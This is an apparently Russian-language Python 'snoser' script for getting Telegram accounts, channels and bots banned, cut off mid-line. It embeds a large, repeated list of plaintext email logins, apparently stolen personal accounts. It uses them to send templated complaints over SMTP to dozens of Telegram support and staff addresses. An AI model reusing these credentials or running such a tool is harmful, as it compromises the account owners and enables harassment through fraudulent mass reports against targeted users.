from colorama import Fore, Style, init
import random
import string
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import requests
from telethon.sync import TelegramClient
from telethon.tl.functions.channels import ReportSpamRequest
import pyfiglet
from termcolor import colored
import os

clr = """
if platform.system() == "Windows":
    os.system('cls')
else:
    os.system('clear')
"""


ascii_banner = pyfiglet.figlet_format(" CHOCEP", font="poison")
colored_banner = colored(ascii_banner, color="red")
colored_about = colored("      FOSERT SNOSER PRIVATE v1.0", color="red")
colored_about2 = colored("      Our telegram channel  –  @NoEyeOfGod", color="red")
print(colored_banner)
print()
print(colored_about)
print(colored_about2)
print("")

senders = {
'raumonatuhadi@mail.ru': 'a7r6U9J6KHDaguAsidDH',
'floworadpewoodvi@mail.ru': 'ZcyUg5MUq8jMr9i8aST1',
'letzegebquirdisnui@mail.ru': 'abniAcbrCjRskpysMc75',
'millveramontmoni@mail.ru': 'bLd8Zg4tqfxmUq7KW5jW',
'letkixipromnussi@mail.ru': 'bNraxddiagE9Sx23SxYt',
'hotriosmartraverba@mail.ru': 'cALqh0bjnPefyiu7WL0v',
'pillgemisscritcomsa@mail.ru': 'dHBUrMg6aqXhvx0m1cVf',
'leigedeamvebig@mail.ru': 'dVTsGqDbZYbjse9iHNR2',
'knocrufridunringgent@mail.ru': 'dn333DbbuEfGnqw08Rxm',
'tworensodiapansaa@mail.ru': 'dsGajJE1TtiAGgZsgyvQ',
'korlithiobtennick@mail.ru': 'feDLSiueGT89APb81v74',
'terbgebuoviror@mail.ru': 'gaqaKs06xg22kkXXW2LU',
'tioreibunthandvahear@mail.ru': 'ggKygTjxSLzwm4tWd43B',
'korlithiobtennick@mail.ru': 'feDLSiueGT89APb81v74',
'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
'aria.therese.svensson@mail.com': 'Zorro1ab',
'taterbug@verizon.net': 'Holly1!',
'ejbrickner@comcast.net': 'Pass1178',
'teressapeart@cox.net': 'Quinton2329!',
'liznees@verizon.net': 'Dancer008',
'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
'kcdg@charter.net': 'Jennifer3*',
'bean_118@hotmail.com': 'Liverpool118!',
'dsdhjas@mail.com': 'LONGHACH123',
'robitwins@comcast.net': 'May241996',
'wasina@live.com': 'Marlas21',
'aruzhan.01@mail.com': '1234567!',
'rob.tackett@live.com': 'metallic',
'lindahallenbeck@verizon.net': 'Anakin@2014',
'hlaw82@mail.com': 'Snoopy37$$',
'paintmadman@comcast.net': 'mycat2200*',
'prideandjoy@verizon.net': 'Ihatejen12',
'sdgdfg56@mail.com': 'kenwood4201',
'garrett.danelz@comcast.net': 'N11golfer!',
'gillian_1211@hotmail.com': 'Gilloveu1211',
'sunpit16@hotmail.com': 'Putter34!',
'fdshelor@verizon.net': 'Masco123*',
'yeags1@cox.net': 'Zoomom1965!',
'amine002@usa.com': 'iScrRoXAei123',
'bbarcelo16@cox.net': 'Bsb161089$$',
'laliebert@hotmail.com': 'pirates2',
'vallen285@comcast.net': 'Delft285!1!',
'sierra12@email.com': 'tegen1111',
'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
'kmay@windstream.net': 'Nascar98',
'redbrick1@mail.com': 'Redbrick11',
'ivv9ah7f@mail.com': 'K226nw8duwg',
'erkobir@live.com': 'floydLAWTON019',
'Misscarter@mail.com': 'ashtray19',
'carlieruby10@cox.net': 'Lollypop789$',
'blackops2013@mail.com': 'amason123566',
'caroline_cullum@comcast.net': 'carter14',
'dpb13@live.com': 'Ic&ynum13',
'heirhunter@usa.com': 'Noguys@714',
'sherri.edwards@verizon.net': 'Dreaming123#',
'rami.rami1980@hotmail.com': 'ramirami1980',
'jmsingleton2@comcast.net': '151728Jn$$',
'aberancho@aol.com': '10diegguuss10',
'dgidel@iowatelecom.net': 'Buster48',
'gpopandopul@mail.com': 'GEORG62A',
'bolgodonsk@mail.com': '012345678!',
'colbycolb@cox.net': 'Signals@1',
'nicrey4@comcast.net': 'Dabears54',
'mordechai@mail.com': 'Mordechai',
'inemrzoya@mail.com': 'rLS1elaUrLS1elaU',
'tarabedford@comcast.net': 'Money4me',
'mycockneedsit@mail.com': 'benjamin3',
'saralaine@mail.com': 'sarlaine12!1',
'jonb2006@verizon.net': '1969Camaro',
'rjhssa1@verizon.net': 'Donna613*',
'cameron.doug@charter.net': 'Jake2122$',
'bridget.shappell@comcast.net': 'Brennan1',
'rugs8@comcast.net': 'baseball46',
'averyjacobs3@mail.com': '1960682644!',
'lstefanick@hotmail.com': 'Luv2dance2',
'bchavez123@mail.com': 'aadrianachavez',
'lukejamesjones@mail.com': 'tinkerbell1',
'emahoney123@comcast.net': 'Shieknmme3#',
'mandy10.mcevoy@btinternet.com': 'Tr1plets3',
'jet747@cox.net': 'Sadie@1234',
'landsgascareservices@mail.com': 'Alisha25@',
'samantha224@mail.com': 'Madden098!@',
'kbhamil@wowway.com': 'Carol1940',
'email@bjasper.com': 'Lhsnh4us123!',
'biggsbrian@cox.net': 'Trains@2247Trains@2247',
'dzzeblnd@aol.com': 'Geosgal@1',
'jtrego@indy.rr.com': 'Jackwill14!',
'chrisphonte.rj@comcast.net': 'Junior@3311',
'tvwifiguy@comcast.net': 'Bill#0101',
'defenestrador@mail.com': 'm0rb1d8ss',
'glangley@gmx.com': 'ironhide',
'charlotte2850@hotmail.com': 'kelalu2850',
'sanya.dragonov@mail.ru': 'RakuzanSnos',
'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
'aria.therese.svensson@mail.com': 'Zorro1ab',
'taterbug@verizon.net': 'Holly1!',
'ejbrickner@comcast.net': 'Pass1178',
'teressapeart@cox.net': 'Quinton2329!',
'liznees@verizon.net': 'Dancer008',
'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
'kcdg@charter.net': 'Jennifer3*',
'bean_118@hotmail.com': 'Liverpool118!',
'dsdhjas@mail.com': 'LONGHACH123',
'robitwins@comcast.net': 'May241996',
'wasina@live.com': 'Marlas21',
'aruzhan.01@mail.com': '1234567!',
'rob.tackett@live.com': 'metallic',
'lindahallenbeck@verizon.net': 'Anakin@2014',
'hlaw82@mail.com': 'Snoopy37$$',
'paintmadman@comcast.net': 'mycat2200*',
'prideandjoy@verizon.net': 'Ihatejen12',
'sdgdfg56@mail.com': 'kenwood4201',
'garrett.danelz@comcast.net': 'N11golfer!',
'gillian_1211@hotmail.com': 'Gilloveu1211',
'sunpit16@hotmail.com': 'Putter34!',
'fdshelor@verizon.net': 'Masco123*',
'yeags1@cox.net': 'Zoomom1965!',
'amine002@usa.com': 'iScrRoXAei123',
'bbarcelo16@cox.net': 'Bsb161089$$',
'laliebert@hotmail.com': 'pirates2',
'vallen285@comcast.net': 'Delft285!1!',
'sierra12@email.com': 'tegen1111',
'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
'kmay@windstream.net': 'Nascar98',
'redbrick1@mail.com': 'Redbrick11',
'ivv9ah7f@mail.com': 'K226nw8duwg',
'erkobir@live.com': 'floydLAWTON019',
'Misscarter@mail.com': 'ashtray19',
'carlieruby10@cox.net': 'Lollypop789$',
'blackops2013@mail.com': 'amason123566',
'caroline_cullum@comcast.net': 'carter14',
'dpb13@live.com': 'Ic&ynum13',
'heirhunter@usa.com': 'Noguys@714',
'sherri.edwards@verizon.net': 'Dreaming123#',
'rami.rami1980@hotmail.com': 'ramirami1980',
'jmsingleton2@comcast.net': '151728Jn$$',
'aberancho@aol.com': '10diegguuss10',
'dgidel@iowatelecom.net': 'Buster48',
'gpopandopul@mail.com': 'GEORG62A',
'bolgodonsk@mail.com': '012345678!',
'colbycolb@cox.net': 'Signals@1',
'korlithiobtennick@mail.ru': 'feDLSiueGT89APb81v74',
'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
'aria.therese.svensson@mail.com': 'Zorro1ab',
'taterbug@verizon.net': 'Holly1!',
'ejbrickner@comcast.net': 'Pass1178',
'teressapeart@cox.net': 'Quinton2329!',
'liznees@verizon.net': 'Dancer008',
'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
'kcdg@charter.net': 'Jennifer3*',
'bean_118@hotmail.com': 'Liverpool118!',
'dsdhjas@mail.com': 'LONGHACH123',
'robitwins@comcast.net': 'May241996',
'wasina@live.com': 'Marlas21',
'aruzhan.01@mail.com': '1234567!',
'rob.tackett@live.com': 'metallic',
'lindahallenbeck@verizon.net': 'Anakin@2014',
'hlaw82@mail.com': 'Snoopy37$$',
'paintmadman@comcast.net': 'mycat2200*',
'prideandjoy@verizon.net': 'Ihatejen12',
'sdgdfg56@mail.com': 'kenwood4201',
'garrett.danelz@comcast.net': 'N11golfer!',
'gillian_1211@hotmail.com': 'Gilloveu1211',
'sunpit16@hotmail.com': 'Putter34!',
'fdshelor@verizon.net': 'Masco123*',
'yeags1@cox.net': 'Zoomom1965!',
'amine002@usa.com': 'iScrRoXAei123',
'bbarcelo16@cox.net': 'Bsb161089$$',
'laliebert@hotmail.com': 'pirates2',
'vallen285@comcast.net': 'Delft285!1!',
'sierra12@email.com': 'tegen1111',
'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
'kmay@windstream.net': 'Nascar98',
'redbrick1@mail.com': 'Redbrick11',
'ivv9ah7f@mail.com': 'K226nw8duwg',
'erkobir@live.com': 'floydLAWTON019',
'Misscarter@mail.com': 'ashtray19',
'carlieruby10@cox.net': 'Lollypop789$',
'blackops2013@mail.com': 'amason123566',
'caroline_cullum@comcast.net': 'carter14',
'dpb13@live.com': 'Ic&ynum13',
'heirhunter@usa.com': 'Noguys@714',
'sherri.edwards@verizon.net': 'Dreaming123#',
'rami.rami1980@hotmail.com': 'ramirami1980',
'jmsingleton2@comcast.net': '151728Jn$$',
'aberancho@aol.com': '10diegguuss10',
'dgidel@iowatelecom.net': 'Buster48',
'gpopandopul@mail.com': 'GEORG62A',
'bolgodonsk@mail.com': '012345678!',
'colbycolb@cox.net': 'Signals@1',
'nicrey4@comcast.net': 'Dabears54',
'mordechai@mail.com': 'Mordechai',
'inemrzoya@mail.com': 'rLS1elaUrLS1elaU',
'tarabedford@comcast.net': 'Money4me',
'mycockneedsit@mail.com': 'benjamin3',
'saralaine@mail.com': 'sarlaine12!1',
'jonb2006@verizon.net': '1969Camaro',
'rjhssa1@verizon.net': 'Donna613*',
'cameron.doug@charter.net': 'Jake2122$',
'bridget.shappell@comcast.net': 'Brennan1',
'rugs8@comcast.net': 'baseball46',
'averyjacobs3@mail.com': '1960682644!',
'lstefanick@hotmail.com': 'Luv2dance2',
'bchavez123@mail.com': 'aadrianachavez',
'lukejamesjones@mail.com': 'tinkerbell1',
'emahoney123@comcast.net': 'Shieknmme3#',
'mandy10.mcevoy@btinternet.com': 'Tr1plets3',
'jet747@cox.net': 'Sadie@1234',
'landsgascareservices@mail.com': 'Alisha25@',
'samantha224@mail.com': 'Madden098!@',
'kbhamil@wowway.com': 'Carol1940',
'email@bjasper.com': 'Lhsnh4us123!',
'biggsbrian@cox.net': 'Trains@2247Trains@2247',
'dzzeblnd@aol.com': 'Geosgal@1',
'jtrego@indy.rr.com': 'Jackwill14!',
'chrisphonte.rj@comcast.net': 'Junior@3311',
'tvwifiguy@comcast.net': 'Bill#0101',
'defenestrador@mail.com': 'm0rb1d8ss',
'glangley@gmx.com': 'ironhide',
'zmbuohbo@nietamail.com': 'bwhshijvS!7708',
'mzwdxmbr@vecinomail.com': 'yogovhrcS!9604',
'sdwljbvw@senoramail.com': 'fhfmqzwhS!3765',
'bvmqjvxg@menormail.com': 'obcyxskhX!5435',
'vpdsmckd@nietamail.com': 'soivmwqbA!4968',
'rtckyhny@vecinomail.com': 'xxtgawjxX!8484',
'etczzucr@senoramail.com': 'jlgflnfvS!9717',
'muztpwnl@menormail.com': 'xplstfvnA!4629',
'afbzgbqs@nietamail.com': 'hcthlbkkS!9664',
'vwnajvtb@vecinomail.com': 'qpaufpfdX!6846',
'ndnxnqst@senoramail.com': 'uamvwtvxY!4448',
'aehbzvtn@menormail.com': 'pdzabldbX!1586',
'yuofldqp@nietamail.com': 'uumnzcoqA!9950',
'iryxsvsg@vecinomail.com': 'hcnkpndqY!3869',
'adeppaas@senoramail.com': 'qdjmsbtrY!8595',
'vbrexarm@menormail.com': 'mpyxepysX!5838',
'uiwedngh@nietamail.com': 'xenlwbqqX!3150',
'kgwbdctw@vecinomail.com': 'vgnbhgclX!7983',
'yxjcdhet@senoramail.com': 'ykfdidaiY!2510',
'hfrtvmrz@menormail.com': 'cirrohtjY!3834',
'mpudwtru@nietamail.com': 'ofdhcbjqX!8197',
'eoulmbhe@vecinomail.com': 'wdcytnqaY!2858',
'diniduks@senoramail.com': 'qdatfzqaS!4552',
'acpidkkq@menormail.com': 'slownwabX!7663',
'nkpswjsb@nietamail.com': 'tjyaixxvY!7554',
'charlotte2850@hotmail.com': 'kelalu2850',
'korlithiobtennick@mail.ru': 'feDLSiueGT89APb81v74',
'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
'aria.therese.svensson@mail.com': 'Zorro1ab',
'taterbug@verizon.net': 'Holly1!',
'ejbrickner@comcast.net': 'Pass1178',
'teressapeart@cox.net': 'Quinton2329!',
'liznees@verizon.net': 'Dancer008',
'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
'kcdg@charter.net': 'Jennifer3*',
'bean_118@hotmail.com': 'Liverpool118!',
'dsdhjas@mail.com': 'LONGHACH123',
'robitwins@comcast.net': 'May241996',
'wasina@live.com': 'Marlas21',
'aruzhan.01@mail.com': '1234567!',
'rob.tackett@live.com': 'metallic',
'lindahallenbeck@verizon.net': 'Anakin@2014',
'hlaw82@mail.com': 'Snoopy37$$',
'paintmadman@comcast.net': 'mycat2200*',
'prideandjoy@verizon.net': 'Ihatejen12',
'sdgdfg56@mail.com': 'kenwood4201',
'garrett.danelz@comcast.net': 'N11golfer!',
'gillian_1211@hotmail.com': 'Gilloveu1211',
'sunpit16@hotmail.com': 'Putter34!',
'fdshelor@verizon.net': 'Masco123*',
'yeags1@cox.net': 'Zoomom1965!',
'amine002@usa.com': 'iScrRoXAei123',
'bbarcelo16@cox.net': 'Bsb161089$$',
'laliebert@hotmail.com': 'pirates2',
'vallen285@comcast.net': 'Delft285!1!',
'sierra12@email.com': 'tegen1111',
'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
'kmay@windstream.net': 'Nascar98',
'redbrick1@mail.com': 'Redbrick11',
'ivv9ah7f@mail.com': 'K226nw8duwg',
'erkobir@live.com': 'floydLAWTON019',
'Misscarter@mail.com': 'ashtray19',
'carlieruby10@cox.net': 'Lollypop789$',
'blackops2013@mail.com': 'amason123566',
'caroline_cullum@comcast.net': 'carter14',
'dpb13@live.com': 'Ic&ynum13',
'heirhunter@usa.com': 'Noguys@714',
'sherri.edwards@verizon.net': 'Dreaming123#',
'rami.rami1980@hotmail.com': 'ramirami1980',
'jmsingleton2@comcast.net': '151728Jn$$',
'aberancho@aol.com': '10diegguuss10',
'dgidel@iowatelecom.net': 'Buster48',
'gpopandopul@mail.com': 'GEORG62A',
'bolgodonsk@mail.com': '012345678!',
'colbycolb@cox.net': 'Signals@1',
'nicrey4@comcast.net': 'Dabears54',
'mordechai@mail.com': 'Mordechai',
'inemrzoya@mail.com': 'rLS1elaUrLS1elaU',
'tarabedford@comcast.net': 'Money4me',
'mycockneedsit@mail.com': 'benjamin3',
'saralaine@mail.com': 'sarlaine12!1',
'jonb2006@verizon.net': '1969Camaro',
'rjhssa1@verizon.net': 'Donna613*',
'cameron.doug@charter.net': 'Jake2122$',
'bridget.shappell@comcast.net': 'Brennan1',
'rugs8@comcast.net': 'baseball46',
'averyjacobs3@mail.com': '1960682644!',
'lstefanick@hotmail.com': 'Luv2dance2',
'bchavez123@mail.com': 'aadrianachavez',
'lukejamesjones@mail.com': 'tinkerbell1',
'emahoney123@comcast.net': 'Shieknmme3#',
'mandy10.mcevoy@btinternet.com': 'Tr1plets3',
'jet747@cox.net': 'Sadie@1234',
'landsgascareservices@mail.com': 'Alisha25@',
'samantha224@mail.com': 'Madden098!@',
'kbhamil@wowway.com': 'Carol1940',
'email@bjasper.com': 'Lhsnh4us123!',
'biggsbrian@cox.net': 'Trains@2247Trains@2247',
'dzzeblnd@aol.com': 'Geosgal@1',
'jtrego@indy.rr.com': 'Jackwill14!',
'chrisphonte.rj@comcast.net': 'Junior@3311',
'tvwifiguy@comcast.net': 'Bill#0101',
'defenestrador@mail.com': 'm0rb1d8ss',
'glangley@gmx.com': 'ironhide',
'charlotte2850@hotmail.com': 'kelalu2850'
}

# \xd0\x9f\xd0\xbe\xd0\xbb\xd1\x83\xd1\x87\xd0\xb0\xd1\x82\xd0\xb5\xd0\xbb\xd0\xb8

receivers = ['sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org', 'sticker@telegram.org', 'support@telegram.org','support@telegram.org', 'dmca@telegram.org', 'security@telegram.org','sms@telegram.org', 'info@telegram.org', 'marta@telegram.org', 'spam@telegram.org', 'alex@telegram.org', 'abuse@telegram.org', 'pavel@telegram.org', 'durov@telegram.org', 'lies@telegram.org', 'ceo@telegram.org', 'mr@telegram.org', 'levlam@telegram.org', 'perekopsky@telegram.org', 'recover@telegram.org', 'germany@telegram.org', 'hyman@telegram.org', 'qa@telegram.org', 'Stickers@telegram.org', 'ir@telegram.org', 'vadim@telegram.org', 'shyam@telegram.org', 'stopca@telegram.org', 'support@telegram.org', 'ask@telegram.org', '125support@telegram.org', 'me@telegram.org', 'enquiries@telegram.org', 'api_support@telegram.org', 'marketing@telegram.org', 'ca@telegram.org', 'recovery@telegram.org', 'http@telegram.org', 'corp@telegram.org', 'corona@telegram.org', 'ton@telegram.org', 'sticker@telegram.org']


def decode(q: bytes):
    return q.decode()


def print_logo():
    logo =[]
    print("")
    green_color = "\\033[32m"  # \xd0\x97\xd0\xb5\xd0\xbb\xd0\xb5\xd0\xbd\xd1\x8b\xd0\xb9 \xd1\x86\xd0\xb2\xd0\xb5\xd1\x82 ANSI escape \xd0\xba\xd0\xbe\xd0\xb4
    reset_color = "\\033[0m"   # \xd0\xa1\xd0\xb1\xd1\x80\xd0\xbe\xd1\x81 \xd1\x86\xd0\xb2\xd0\xb5\xd1\x82\xd0\xb0 ANSI escape \xd0\xba\xd0\xbe\xd0\xb4

    for line in logo:
        print(green_color + line + reset_color)


def print_menu():
    print(decode(b"\xd0\x9c\xd0\xb5\xd0\xbd\xd1\x8e: "))
    print(decode(b"1. \xd0\xa1\xd0\xbd\xd0\xbe\xd1\x81 \xd0\xb0\xd0\xba\xd0\xba\xd0\xb0\xd1\x83\xd0\xbd\xd1\x82\xd0\xb0"))
    print(decode(b"2. \xd0\xa1\xd0\xbd\xd0\xbe\xd1\x81 \xd0\xba\xd0\xb0\xd0\xbd\xd0\xb0\xd0\xbb\xd0\xb0"))
    print(decode(b"3. \xd0\xa1\xd0\xbd\xd0\xbe\xd1\x81 \xd0\xb1\xd0\xbe\xd1\x82\xd0\xbe\xd0\xb2"))
    print(decode(b"4. \xd0\xa1\xd0\xbe\xd0\xb7\xd0\xb4\xd0\xb0\xd1\x82\xd0\xb5\xd0\xbb\xd0\xb8"))


def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP('smtp.mail.ru', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        time.sleep(3)
        server.quit()
        return True
    except Exception:
        return False


def handle_complaint(senders, receivers):
    global complaint_type
    sent_emails = 0
    print_logo()
    print_menu()
    choice = input(decode(b"\xd0\x92\xd1\x8b\xd0\xb1\xd0\xbe\xd1\x80:"))
    complaint_type = ""

    if choice == "1":

        print(decode(b"\xd0\x92\xd1\x8b\xd0\xb1\xd0\xb5\xd1\x80\xd0\xb8\xd1\x82\xd0\xb5 \xd1\x82\xd0\xb8\xd0\xbf \xd0\xb6\xd0\xb0\xd0\xbb\xd0\xbe\xd0\xb1\xd1\x8b:"))
        print(decode(b"1.1 \xd0\x9e\xd0\xb1\xd1\x8b\xd1\x87\xd0\xbd\xd1\x8b\xd0\xb9"))
        print(decode(b"1.2 \xd0\xa1\xd0\xbd\xd0\xbe\xd1\x81 \xd1\x81\xd0\xb5\xd1\x81\xd1\x81\xd0\xb8\xd0\xb9"))
        print(decode(b"1.3 \xd0\xa1\xd0\xbd\xd0\xbe\xd1\x81 \xd1\x82\xd1\x80\xd0\xbe\xd0\xbb\xd0\xbb\xd0\xb5\xd0\xb9"))
        
        complaint_choice = input(decode(b"\xd0\x92\xd0\xb0\xd1\x88 \xd0\xb2\xd1\x8b\xd0\xb1\xd0\xbe\xd1\x80: "))

        if complaint_choice == "1.1":
            print(decode(b"\xd0\x92\xd0\xb2\xd0\xb5\xd0\xb4\xd0\xb8\xd1\x82\xd0\xb5 \xd0\xbf\xd1\x80\xd0\xb8\xd1\x87\xd0\xb8\xd0\xbd\xd1\x83, \xd1\x8e\xd0\xb7\xd0\xb5\xd1\x80\xd0\xbd\xd0\xb5\xd0\xb9\xd0\xbc, telegram ID, \xd0\xb7\xd0\xb0\xd1\x82\xd0\xb5\xd0\xbc \xd1\x81\xd1\x81\xd1\x8b\xd0\xbb\xd0\xba\xd0\xb8 \xd0\xbd\xd0\xb0 \xd0\xba\xd0\xb0\xd0\xbd\xd0\xb0\xd0\xbb/\xd1\x87\xd0\xb0\xd1\x82 \xd0\xb8 \xd0\xbd\xd0\xb0 \xd0\xbd\xd0\xb0\xd1\x80\xd1\x83\xd1\x88\xd0\xb5\xd0\xbd\xd0\xb8\xd0\xb5"))
            reason = input(decode(b"\xd0\x9f\xd1\x80\xd0\xb8\xd1\x87\xd0\xb8\xd0\xbd\xd0\xb0: "))
            username = input(decode(b"\xd0\xae\xd0\xb7\xd0\xb5\xd1\x80\xd0\xbd\xd0\xb5\xd0\xb9\xd0\xbc: "))
            telegram_ID = input("Telegram ID: ")
            chat_link = input(decode(b"\xd0\xa1\xd1\x81\xd1\x8b\xd0\xbb\xd0\xba\xd0\xb0 \xd0\xbd\xd0\xb0 \xd1\x87\xd0\xb0\xd1\x82: "))
            violation_chat_link = input(decode(b"\xd0\xa1\xd1\x81\xd1\x8b\xd0\xbb\xd0\xba\xd0\xb0 \xd0\xbd\xd0\xb0 \xd0\xbd\xd0\xb0\xd1\x80\xd1\x83\xd1\x88\xd0\xb5\xd0\xbd\xd0\xb8\xd0\xb5: "))

            complaint_texts = {
                "1.1": f"Здравствуйте, уважаемая поддержка, в вашей сети я нашел телеграм аккаунт, который нарушает ваши правила, такие как {reason}. Его юзернейм - {username}, так же его контактный ID - {telegram_ID}. Ссылка на чат с нарушениями - {chat_link}, ссылки на нарушения - {violation_chat_link}. Спасибо за помощь."
            }

            for sender_email, sender_password in senders.items():
                for receiver_email in receivers:
                    complaint_text = complaint_texts[complaint_choice]
                    complaint_body = complaint_text.format(reason=reason.strip(), username=username.strip(), telegram_ID=telegram_ID.strip(), chat_link=chat_link.strip(), violation_chat_link=violation_chat_link.strip())
                    send_email(receiver_email, sender_email, sender_password, decode(b"\xd0\x96\xd0\xb0\xd0\xbb\xd0\xbe\xd0\xb1\xd0\xb0 \xd0\xbd\xd0\xb0 Telegram \xd0\xb0\xd0\xba\xd0\xba\xd0\xb0\xd1\x83\xd0\xbd\xd1\x82"), complaint_body)
                    print(f"Отправлено на {receiver_email} от {sender_email}!")
                    sent_emails += 1

        elif complaint_choice == "1.2":
            account_username = input(decode(b"\xd0\xae\xd0\xb7\xd0\xb5\xd1\x80\xd0\xbd\xd0\xb
